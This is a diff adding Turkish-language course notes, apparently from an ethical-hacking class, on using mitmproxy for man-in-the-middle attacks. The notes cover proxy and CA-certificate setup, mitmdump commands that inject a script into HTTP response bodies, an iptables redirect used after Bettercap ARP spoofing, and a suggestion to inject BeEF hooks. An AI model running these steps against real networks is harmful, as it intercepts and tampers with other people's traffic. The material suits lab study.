@@ -1,0 +1,67 @@
+https://mitmproxy.org/    //mitmproxy indirme sayfası
+
+Proxy Ayarları:
+
+//firefox ayarlarından network settings aç
+
+Manual proxy configuration
+HTTP Proxy 127.0.0.1
+Port 8080
+
+Also use this proxy for HTTPS
+
+HTTPS Proxy 127.0.0.1
+Port 8080
+
+SOCKS Host 127.0.0.1
+Port 8080
+
+//olarak ayarla
+
+////////////////////////////////////////////////////////////////////////////////////
+Sertifika Yüklemek:
+//mitmweb açıkken tarayıcıya mitm.it yazarsak bizi settifikaların olduğu sayfaya götürecektir.
+Buradan linux için olanı indiriyoruz ve /usr/local/share/ dizinine kaydedip güncelliyoruz. daha sonra firefox ayarlarını açıp certificate yazan yere bunun bir kopyasını import ediyoruz.
+
+
+mv mitmproxy-ca-cert.pem /usr/local/share/ca-certificates/mitmproxy.crt
+sudo update-ca-certificates
+
+////////////////////////////////////////////////////////////////
+
+mitmweb = arayüzü var
+
+./mitmdump --replace :~s:"</body>":"<script>alert('I hack you');</script></body>"   // bununla uyarı verdi çalışmadı.
+
+
+./mitmdump --modify-body :~s:"</body>":"<script>alert('I hack you');</script></body>"
+
+
+
+##MITMPROXY
+//Ortadaki adam saldırısında bunu uygulayabiliriz.
+//Bettercap ile arpspoof saldırısı yaptıktan sonra;
+
+sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+
+
+//bu komutu terminalde yazarsak, 80 portundan 8080 portuna mitmweb toolunun açık olduğu portuna yönlendirir bizi orada istediğimiz kontralleri sağlayabiliriz.
+Not: eğer bazı şeyler ters giderse o zaman konsolo; ./mitmweb --mode transparent ile mitmweb çalıştırmayı deneyebilirsin.
+Not2: https sitelerinde çalışmıyor.
+Not3: script bloğunun içine beef injection da yapabilirsin.
+
+
+
+
+[Errno 98] HTTP(S) proxy failed to listen on *:8080 with [Errno 98] error while attempting to bind on address ('::', 8080, 0, 0): address already in use
+
+
+Yukarıdaki hatayı alan arkadaşlar Firefox, proxy ayarlarından kullandğı portları başka bir port olarak ayarlar ve ayarladığı portu mitm kodunun sonuna --mode regular@<ayarlanan port> şeklinde girerse sorun çözülecektir.
+
+
+Örnek(port proxy ayarlarından 4040 olarak ayarlandıktan sonra):
+
+./mitmdump --modify-body :~s:"</body>":"<script>alert('i hack you');</script></body>" --mode regular@4040
+
+
+Not: Birkaç ders sonra "Saldırı ve Enjeksiyon" adlı derste yazılan iptables komutunda da portu 4040 olarak değiştirmeniz gerekecek. Siz başka port ayarladıysanız ayarladığınız portu yazacaksınız.
